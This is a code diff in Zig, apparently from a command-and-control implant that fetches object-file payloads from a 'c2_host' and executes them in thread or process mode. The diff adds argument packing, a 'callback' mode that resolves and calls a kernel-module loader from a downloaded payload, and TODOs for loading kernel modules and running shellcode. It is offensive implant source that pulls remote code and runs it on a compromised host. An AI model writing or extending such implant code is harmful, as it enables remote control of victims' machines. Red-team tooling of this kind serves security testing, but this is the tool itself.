@@ -14,6 +14,12 @@ const debug_proxy_enabled = false;
 const debug_proxy_host = "127.0.0.1";
 const debug_proxy_port = 8080;
 
+const GlobalFuncTable = struct {
+  loadKernelMod: ?*const fn (mod_name: [*:0]const u8) callconv(.C) c_int = null,
+};
+
+var global_func_table: GlobalFuncTable = .{};
+
 fn fetchBofContent(allocator: std.mem.Allocator, state: *State, bof_uri: []const u8) ![]const u8 {
 
     const uri = try std.fmt.allocPrint(allocator, "http://{s}{s}", .{ c2_host, bof_uri });
@@ -178,10 +184,6 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     var bof_context: ?*bof.Context = null;
     errdefer if (bof_context) |context| context.release();
 
-    // TODO: bof_args crafting
-    // build 'args' by parsing 'argv' and inspecting args_spec:
-    // possible values in 'header': iszZb
-
     std.log.info("bof_argv: {any}", .{bof_argv.?});
 
     const bof_args = try bof.Args.init();
@@ -190,6 +192,8 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     var iter = std.mem.tokenizeScalar(u8, bof_argv.?, ' ');
     var i: u32 = 0;
 
+    // build 'bof_args' by parsing 'argv' and inspecting args_spec:
+    // possible values for args_spec: iszZb
     bof_args.begin();
     while (iter.next()) |arg| {
         std.log.info("Adding arg: {s}", .{arg});
@@ -231,21 +235,33 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     } else if (std.mem.eql(u8, exec_mode, "thread")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
-        // TODO: it won't work bof_argv needs to be converted to bofsArg first
         bof_context = try bof_to_exec.runAsyncThread(
-            @constCast(bof_argv),
+            bof_args.getBuffer(),
             null,
             null,
         );
     } else if (std.mem.eql(u8, exec_mode, "process")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
-        // TODO: it won't work bof_argv needs to be converted to bofsArg first
         bof_context = try bof_to_exec.runAsyncProcess(
-            @constCast(bof_argv),
+            bof_args.getBuffer(),
             null,
             null,
         );
+    }
+    // callback is a special mode of operation: BOF isn't executed (i.e. bof.Context isn't created). It provides one or more
+    // function implementations for global_func_table. BOF is implicitly added to state.persistent_bofs.
+    else if (std.mem.eql(u8, exec_mode, "callback")) {
+        std.log.info("Execution mode: {s}-based", .{exec_mode});
+
+        global_func_table.loadKernelMod = @ptrCast(@alignCast(bof_to_exec.getProcAddress("loadKernelMod")));
+        if(global_func_table.loadKernelMod == null) @panic("bof-launcher panic");
+        _ = global_func_table.loadKernelMod.?("modNameToLoad");
+
+        try state.persistent_bofs.put(hash, bof_to_exec);
+
+        // return here, as we do not create bof.Context so we don't want to append it to state.pending_bofs list
+        return;
     }
 
     if (bof_context) |context| {
@@ -301,6 +317,8 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
         // check type of task to execute:
         // bof - execute bof
         // cmd - execute builtin command (like: sleep 10)
+        // TODO: mod - load and execute chosen kernel module
+        // TODO: bin - execute chosen shellcode
         var root = parsed.value;
         const task = root.object.get("name").?.string;
         const request_id = root.object.get("id").?.string;
@@ -324,6 +342,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
         } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
             std.log.info("Executing builtin command: {s}", .{cmd_name});
 
+            // tasked to execute cmd:release_persistent_bofs
             if (std.mem.eql(u8, cmd_name, "release_persistent_bofs")) {
                 var it = state.persistent_bofs.valueIterator();
                 while (it.next()) |v| {
